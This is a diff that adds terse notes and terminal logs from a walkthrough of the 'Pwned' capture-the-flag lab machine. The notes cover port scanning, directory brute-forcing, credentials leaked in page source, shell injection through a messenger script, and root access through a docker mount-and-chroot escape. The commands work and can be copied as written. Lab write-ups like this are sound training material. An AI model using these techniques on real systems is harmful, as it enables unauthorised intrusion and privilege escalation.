@@ -1,1 +1,179 @@
+└─$ nmap -sV -sC -p 21,80 192.168.56.113
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 22:09 PST
+Nmap scan report for 192.168.56.113
+Host is up (0.00048s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Pwned....!!
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Unix
+
+//21 port is not useful without passwd; start with 80 port, emulate the direcroty
+
+└─$ sudo dirsearch -u http://192.168.56.113 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545
+
+Output File: /home/ed/reports/http_192.168.56.113/_25-01-15_22-11-17.txt
+
+Target: http://192.168.56.113/
+
+[22:11:17] Starting: 
+[22:11:33] 301 -  318B  - /nothing  ->  http://192.168.56.113/nothing/
+[22:14:53] 403 -  279B  - /server-status
+[22:21:22] 301 -  322B  - /hidden_text  ->  http://192.168.56.113/hidden_text/
+
+//we got a hidden_text dir, and under it found a list of dir, then scan if any one is accessible
+
+└─$ sudo dirsearch -u http://192.168.56.113 -w di.txt
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 21
+
+Output File: /home/ed/reports/http_192.168.56.113/_25-01-15_22-10-53.txt
+
+Target: http://192.168.56.113/
+
+[22:10:53] Starting: 
+[22:10:53] 301 -  321B  - /pwned.vuln  ->  http://192.168.56.113/pwned.vuln/
+
+// although the code is 301, try to visit it, we get a access page, F12 view the source code, found a id passwd
+    ftpuser B0ss_B!TcH  
+//use it to login the ftp or ssh the host, both works here.
+
+    ftp> ls
+    229 Entering Extended Passive Mode (|||61856|)
+    150 Here comes the directory listing.
+    -rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
+    -rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
+    226 Directory send OK.
+    ftp> more note.txt
+
+    Wow you are here 
+
+    ariana won't happy about this note 
+
+    sorry ariana :( 
+
+    ariana@pwned:~$ cat user1.txt 
+    congratulations you Pwned ariana 
+
+    Here is your user flag ↓↓↓↓↓↓↓
+
+    fb8d98be1265dd88bac522e1b2182140
+
+    Try harder.need become root
+
+    ariana@pwned:~$ cat ariana-personal.diary 
+    Its Ariana personal Diary :::
+
+    Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
+
+// we found a messager under the home folder, and is editable with 'x' privi
+$cat messager.sh
+
+// and run it by input below commands, we get the shell with id of selena
+    Welcome to linux.messenger 
+
+
+    ariana:
+    selena:
+    ftpuser:
+
+    Enter username to send message : selena
+
+    Enter message for selena :/bin/bash
+
+        Sending message to selena 
+        id
+        uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+        python3
+        >>> exit()
+        python3 -c "import pty;pty.spawn('/bin/bash')"
+        selena@pwned:/home$ ls
+        ariana	ftpuser  messenger.sh  selena
+        selena@pwned:/home$ cd selena/
+        selena@pwned:~$ ls
+        selena-personal.diary  user2.txt
+        selena@pwned:~$ cat user2.txt 
+        711fdfc6caad532815a440f7f295c176
+
+        You are near to me. you found selena too.
+
+        Try harder to catch me
+
+
+        selena@pwned:~$ ls
+        selena-personal.diary  user2.txt
+        selena@pwned:~$ cat selena-personal.diary 
+        Its Selena personal Diary :::
+
+        Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
+
+
+selena@pwned:~$ id
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+//she is a member of docker group
+
+selena@pwned:~$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+privesc             latest              09ae39f0f8fc        4 years ago         88.3MB
+<none>              <none>              e13ad046d435        4 years ago         88.3MB
+alpine              latest              a24bb4013296        4 years ago         5.57MB
+debian              wheezy              10fcec6d95c4        5 years ago         88.3MB
+
+//a image privesc is unnormal
+
+root@fd5b3a744758:/# docker ps -a
+CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS                           PORTS               NAMES
+fd5b3a744758        privesc             "chroot /media bash"   47 seconds ago      Up 47 seconds                                        affectionate_elbakyan
+59f9c733cac9        privesc             "bash /mnt chroot"     42 minutes ago      Exited (139) 42 minutes ago                          loving_goldberg
+a8aa7e587204        privesc             "bash chroot"          43 minutes ago      Exited (139) 43 minutes ago                          upbeat_swartz
+c11867d3d188        privesc             "/bin/bash chroot"     43 minutes ago      Exited (139) 43 minutes ago                          lucid_blackwell
+d893ea3e9f6f        privesc             "/bin/bash"            44 minutes ago      Exited (139) 44 minutes ago                          keen_zhukovsky
+177c2828ebcc        privesc             "-it /bin/bash"        44 minutes ago      Created                                              optimistic_pare
+6c6d9ad7eed3        privesc             "/bin/bash"            About an hour ago   Exited (139) About an hour ago                       naughty_driscoll
+8cdf813fc865        privesc             "bash"                 About an hour ago   Exited (139) About an hour ago                       loving_archimedes
+c12a56960efa        privesc             "/bin/bash"            4 years ago         Exited (139) 4 years ago                             nostalgic_jepsen
+83934b2936a9        privesc             "/bin/bash"            4 years ago         Exited (139) 4 years ago  
+
+// privesc can run bash on it,
+selena@pwned:~$ docker run -v /:/media --rm -it privesc chroot /media bash
+// -v mount a volumn, -it interaction, chroot for /media 
+
+root@51df607c86f1:/home# cd /root
+root@51df607c86f1:~# ls
+root.txt
+root@51df607c86f1:~# cat root
+cat: root: No such file or directory
+root@51df607c86f1:~# cat root.txt 
+4d4098d64e163d2726959455d046fd7c
+You found me. i dont't expect this （◎ . ◎）
+
+I am Ajay (Annlynn) i hacked your server left and this for you.
+
+I trapped Ariana and Selena to takeover your server :)
+
+
+You Pwned the Pwned congratulations :)
+
+share the screen shot or flags to given contact details for confirmation 
+
+Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g
+
+Instgarm   ajs_walker 
+
+Twitter    Ajs_walker 
 
